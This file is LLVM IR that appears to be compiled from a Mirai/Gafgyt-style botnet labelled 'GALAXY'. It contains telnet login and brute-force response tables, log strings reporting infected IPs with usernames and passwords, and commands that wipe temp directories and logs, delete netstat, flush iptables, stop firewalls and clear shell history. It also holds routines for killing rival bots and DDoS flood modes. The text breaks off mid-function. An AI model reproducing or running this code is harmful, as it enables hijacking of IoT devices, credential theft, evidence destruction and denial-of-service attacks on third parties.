@.str.427 = private unnamed_addr constant [7 x i8] c"xxwkvy\00", align 1
@.str.428 = private unnamed_addr constant [7 x i8] c"hcgguc\00", align 1
@.str.429 = private unnamed_addr constant [7 x i8] c"tlrgju\00", align 1
@.str.430 = private unnamed_addr constant [7 x i8] c"yfdieg\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"kuvikr\00", align 1
@.str.432 = private unnamed_addr constant [7 x i8] c"kgymka\00", align 1
@.str.433 = private unnamed_addr constant [7 x i8] c"bxdusa\00", align 1
@.str.434 = private unnamed_addr constant [7 x i8] c"kmijih\00", align 1
@.str.435 = private unnamed_addr constant [7 x i8] c"cmnupe\00", align 1
@.str.436 = private unnamed_addr constant [7 x i8] c"jkuruo\00", align 1
@.str.437 = private unnamed_addr constant [7 x i8] c"hnqdok\00", align 1
@.str.438 = private unnamed_addr constant [7 x i8] c"vxemfi\00", align 1
@.str.439 = private unnamed_addr constant [7 x i8] c"xzdlvy\00", align 1
@Temp_Directorys = global [13 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.450, i32 0, i32 0), i8* null], align 16
@.str.440 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.441 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.442 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.443 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.444 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.445 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.446 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.447 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.448 = private unnamed_addr constant [8 x i8] c"/boot/*\00", align 1
@.str.449 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.450 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.461, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.465, i32 0, i32 0), i8* null], align 16
@.str.451 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.452 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.453 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.454 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.455 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.456 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.457 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.458 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.460 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.461 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.462 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.463 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.465 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.475, i32 0, i32 0), i8* null], align 16
@.str.466 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.467 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.468 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.469 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.471 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.472 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.473 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.474 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.475 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* null], align 16
@.str.476 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.477 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.478 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.480 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.481 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.482 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.483 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.484 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.575 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.485 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.486 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.487 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@MiraiIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.488 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.489 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.490 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.491 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.492 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.493 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.494 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.495 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.496 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.497 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.498 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.499 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.500 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.501 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.502 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.503 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.504 = private unnamed_addr constant [91 x i8] c"[ GALAXY ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.505 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.506 = private unnamed_addr constant [78 x i8] c"[ GALAXY ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.507 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.508 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.509 = private unnamed_addr constant [75 x i8] c"[ GALAXY ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.510 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.511 = private unnamed_addr constant [85 x i8] c"[ GALAXY ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.512 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.513 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [24 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.514, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.516, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.518, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.519, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.520, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.521, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.523, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.524, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.525, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.526, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.527, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.528, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.529, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.530, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.531, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.532, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.533, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.534, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.535, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.536, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.537, i32 0, i32 0)], align 16
@.str.514 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.516 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.518 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.519 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.520 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.521 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.523 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.524 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.525 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.526 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.527 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.528 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.529 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.530 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.531 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.532 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.533 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.534 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.535 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.536 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.537 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.538 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.539 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.540 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.541 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.542 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.543 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.544 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.545 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.546 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.547 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.548 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.549 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.550 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.551 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.552 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.553 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.554 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.555 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.556 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.557 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.558 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.559 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.560 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.561 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.562 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.565 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.566 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.567 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.568 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.569 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.563 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.564 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.570 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.571 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.572 = private unnamed_addr constant [53 x i8] c"[\1B[96mINFECTED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.573 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.574 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %23, i8* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

; <label>:32:                                     ; preds = %22
  br label %33

; <label>:33:                                     ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18

; <label>:36:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
